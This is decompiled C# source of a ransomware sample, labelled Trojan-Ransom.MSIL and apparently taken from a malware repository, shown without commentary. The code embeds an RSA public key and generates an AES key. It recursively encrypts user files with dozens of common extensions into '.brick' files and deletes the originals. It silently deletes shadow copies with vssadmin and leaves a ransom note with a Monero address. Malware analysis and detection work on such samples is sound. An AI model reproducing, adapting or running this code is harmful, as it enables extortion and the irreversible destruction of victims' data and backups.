// Decompiled with JetBrains decompiler
// Type: l25de3a0fbaa3009886613f5e62b92f2.MainForm
// Assembly: l25de3a0fbaa3009886613f5e62b92f2, Version=1.0.7107.28525, Culture=neutral, PublicKeyToken=null
// MVID: 2FC200FD-FAD2-4CE8-A973-FBE7D418F58D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Agent.gen-9866b4f2f533de7d742251915802dab355a59f10a51a8bf7d146fd4cb015cd5a.exe

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace l25de3a0fbaa3009886613f5e62b92f2
{
  public class MainForm : Form
  {
    public AesCryptoServiceProvider l_b4739b77;
    public RNGCryptoServiceProvider dad708cc;
    public string iapoisjd;
    public string blakc = "<RSAKeyValue><Modulus>r7ZCGjpS56/JCtSQ4V1cd1uzuR0EaY1QevtZZzsPApcYYE3I1BS/4Z6uJ7rCwHzXJoV+3QCaEvnJJclB02loMpbhLpLtCkdVrsJugVi2g2jV5IoZ6HiAbG6zSINIPXO2J+lK/ymd3aD+iWhvDqv7LZ+DrVaTVu+VULu+Dlr4IC+7gGFfUQWpVHNI/vZ9069l22KDZpWT69pJbWIOXCA7eW0JHBP/uSK+Gzkti56qEFLDzoAuSDWYF6zQpB21VY72pZYd8qCES0qrmlILe66M39rAjQA+0vEvNk1b0fk3gBJ3CqHxVVxQLAQac2T3s9omaH2+c1ruq2yU+yk0yf/q1wpxUQImGxMfbLKH58JYGSoJsOZdit7HPRHK7GO9l3m8ZWjzmkkLvx0CpDXfWhSCMrYakINCZYaMa76Q3eE4JPIFy3kVzTZq0iWXM91pZx8qQRsb9r6k8+H6Etrv9DgBD6ps7nipDurF8BrLX2kzKRefXARmst+UAm04/horgWH16UO26Jdp+P+97rvkbihKDYNY12q1NNYLY/FDx/JL3xn/qRShk0mjz4QrwC50EKEN2eKxNIzVI0UGYv9lj1iooAk9mD9NwWW3v8iUM56R1p9gkUw7cNl/HiQqLk2FH4Q+nS7h0GBQRzinUUsk+YueorHYpJXi24EXAFc9kQQlkPE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
    private IContainer components = (IContainer) null;

    public MainForm() => this.InitializeComponent();

    private void MainFormLoad(object sender, EventArgs e)
    {
      byte[] numArray = new byte[32];
      this.dad708cc = new RNGCryptoServiceProvider();
      this.dad708cc.GetBytes(numArray);
      RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider();
      this.l_b4739b77 = new AesCryptoServiceProvider();
      this.l_b4739b77.Mode = CipherMode.CBC;
      this.l_b4739b77.Key = numArray;
      cryptoServiceProvider.FromXmlString(this.blakc);
      this.iapoisjd = Convert.ToBase64String(cryptoServiceProvider.Encrypt(numArray, false));
      string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
      if (Directory.Exists(pathRoot + "\\Users"))
        this.e4rt5y67(pathRoot + "\\Users");
      if (Directory.Exists(pathRoot + "\\Documents and Settings"))
        this.e4rt5y67(pathRoot + "\\Documents and Settings");
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.Name != pathRoot && drive.IsReady)
            this.e4rt5y67(drive.Name);
        }
      }
      catch
      {
      }
      new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          FileName = "cmd.exe",
          Arguments = "vssadmin delete shadows /all /quiet"
        }
      }.Start();
      this.l_b4739b77.Key = (byte[]) null;
    }

    private void ec_fl(string dadf)
    {
      byte[] numArray = new byte[16];
      this.dad708cc.GetBytes(numArray);
      this.l_b4739b77.IV = numArray;
      byte[] inputBuffer = File.ReadAllBytes(dadf);
      byte[] bytes;
      try
      {
        bytes = this.l_b4739b77.CreateEncryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
      }
      catch
      {
        return;
      }
      string path = dadf + "." + Convert.ToBase64String(numArray).Replace(":", "$").Replace("/", "#") + ".brick";
      if (checked (256 - path.Length) <= 0)
        return;
      try
      {
        File.WriteAllBytes(path, bytes);
      }
      catch
      {
        return;
      }
      try
      {
        File.Delete(dadf);
      }
      catch
      {
      }
    }

    private void e4rt5y67(string dfi)
    {
      foreach (string file in Directory.GetFiles(dfi))
        this.shsadhi(file);
      foreach (string directory in Directory.GetDirectories(dfi))
      {
        if (!dfi.Contains("Windows") && !dfi.Contains("Program Files") && !dfi.Contains("boot"))
          this.e4rt5y67(directory);
      }
      File.WriteAllText(dfi + "\\ID_GENERATE.TXT", "Read the form text.\r\nDON'T TOUCH THIS FILE!\r\nMonero public key:\r\n43dQ9yguiktUxQrQXcVpEvJtMoKsSfjc1CUpgtmrGRoNFBEEMZiSGPgVo75tWfoeBA6W6NudjgH2c84xcoLTx1xVKigk7wR\r\nID:\r\n" + this.iapoisjd);
    }

    private void shsadhi(string dhddh)
    {
      IList<string> stringList = (IList<string>) new List<string>()
      {
        ".txt",
        ".doc",
        ".xls",
        ".pdf",
        ".ini",
        ".cfg",
        ".conf",
        ".xlsx",
        ".docx",
        ".xlsm",
        ".docm",
        ".ppt",
        ".ps1",
        ".vb",
        ".cer",
        ".pfx",
        ".reg",
        ".zip",
        ".rar",
        ".7z",
        ".pptm",
        ".pptx",
        ".rtf",
        ".tex",
        ".odt",
        ".wpd",
        ".ogg",
        ".m4a",
        ".flv",
        ".wma",
        ".zpl",
        ".midi",
        ".csv",
        ".xml",
        ".dot",
        ".log",
        ".apk",
        ".bat",
        ".mdb",
        ".accdb",
        ".java",
        ".wsf",
        ".com",
        ".gif",
        ".ico",
        ".jpg",
        ".jpeg",
        ".ico",
        ".tif",
        ".tiff",
        ".html",
        ".htm",
        ".cpp",
        ".c",
        ".vob",
        ".svg",
        ".pdb",
        ".css",
        ".py",
        ".php",
        ".asp",
        ".xhtml",
        ".key",
        ".odp",
        ".ods",
        ".xlr",
        ".swf",
        ".nds",
        ".bin",
        ".asm",
        ".ac",
        ".flac",
        ".jtd"
      };
      foreach (string str in (IEnumerable<string>) stringList)
      {
        if (stringList.ToString() != "ID_GENERATE.TXT" && Path.GetExtension(dhddh) == str)
          this.ec_fl(dhddh);
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (MainForm));
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.ClientSize = new Size(818, 553);
      this.ControlBox = false;
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (MainForm);
      this.Text = "l25de3a0fbaa3009886613f5e62b92f2";
      this.Load += new EventHandler(this.MainFormLoad);
      this.ResumeLayout(false);
    }
  }
}
